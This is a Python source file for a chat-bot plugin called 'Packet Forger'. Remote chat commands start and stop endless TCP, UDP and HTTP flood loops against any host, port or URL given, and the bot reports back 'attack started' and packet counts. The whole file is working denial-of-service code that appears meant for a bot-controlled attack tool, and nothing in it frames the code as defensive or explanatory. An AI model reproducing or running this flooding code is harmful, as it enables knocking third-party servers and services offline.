from plugins import Plugin, Command

from threading import Thread
from queue import Queue

from time import sleep
import sys
import socket
import os

from urllib import urlopen


class Main(Plugin):

    name = 'Packet Forger'
    version = '1.0.0'
    
    def setup(self):

        self.mtu_size = 1500

        self.tcp_payload = os.urandom(self.mtu_size)
        self.udp_payload = os.urandom(self.mtu_size)

        self.tcp_stop = False
        self.udp_stop = False
        self.http_stop = False

        c = Command('/forge_tcp', usage='HOSTNAME /forge_tcp <host> <port> - forge TCP packets to <host>:<port> until /forge_tcp_stop')
        self.add_command(c)
        
        c = Command('/forge_tcp_stop', usage='HOSTNAME /forge_tcp_stop - stop current TCP attack')
        self.add_command(c)
        
        c = Command('/forge_udp', usage='HOSTNAME /forge_udp <host> <port> - forge UDP packets to <host>:<port> until /forge_udp_stop')
        self.add_command(c)
        
        c = Command('/forge_udp_stop', usage='HOSTNAME /forge_udp_stop - stop current UDP attack')
        self.add_command(c)
        
        c = Command('/forge_http', usage='HOSTNAME /forge_http <url> - forge HTTP packets to <url> until /forge_http_stop')
        self.add_command(c)
        
        c = Command('/forge_http_stop', usage='HOSTNAME /forge_http_stop - stop current HTTP attack')
        self.add_command(c)
        
        
    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/forge_tcp':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_forge_tcp, args=tuple(arg_list))
            t.start()

        elif command == '/forge_tcp_stop':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_forge_tcp_stop)
            t.start()

        elif command == '/forge_udp':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_forge_udp, args=tuple(arg_list))
            t.start()

        elif command == '/forge_udp_stop':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_forge_udp_stop)
            t.start()

        elif command == '/forge_http':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_forge_http, args=tuple(arg_list))
            t.start()
        
        elif command == '/forge_http_stop':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_forge_http_stop)
            t.start()

    def handle_forge_tcp_stop(self):
        self.tcp_stop = True

    def handle_forge_tcp(self, chat_id, host, port):
        self.tcp_stop = False
        packet_count = 0
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((host, int(port)))
                self.bot.send_message(chat_id, 'TCP attack against {}:{} started'.format(host, port))
            except:
                self.bot.send_message(chat_id, 'Error: Connection to {}:{} failed'.format(host, port))
            while not self.tcp_stop:
                try:
                    s.send(self.tcp_payload)
                    packet_count += 1
                except Exception as e:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, int(port)))

            self.bot.send_message(chat_id, 'TCP attack against {}:{} stopped after {} packets'.format(host, port, packet_count))

        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

    def handle_forge_udp_stop(self):
        self.udp_stop = True

    def handle_forge_udp(self, chat_id, host, port):
        self.udp_stop = False
        packet_count = 0
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.bot.send_message(chat_id, 'UDP attack against {}:{} started'.format(host, port))
            while not self.udp_stop:
                    s.sendto(self.tcp_payload, (host, int(port)))
                    packet_count += 1

            self.bot.send_message(chat_id, 'UDP attack against {}:{} stopped after {} packets'.format(host, port, packet_count))

        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

    def handle_forge_http_stop(self):
        self.http_stop = True

    def handle_forge_http(self, chat_id, url):
        self.http_stop = False
        packet_count = 0
        try:
            self.bot.send_message(chat_id, 'HTTP attack against {} started'.format(url))
            while not self.http_stop:
                r = urlopen(url).read()
                packet_count += 1
            self.bot.send_message(chat_id, 'HTTP attack against {} stopped after {} packets'.format(url, packet_count))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
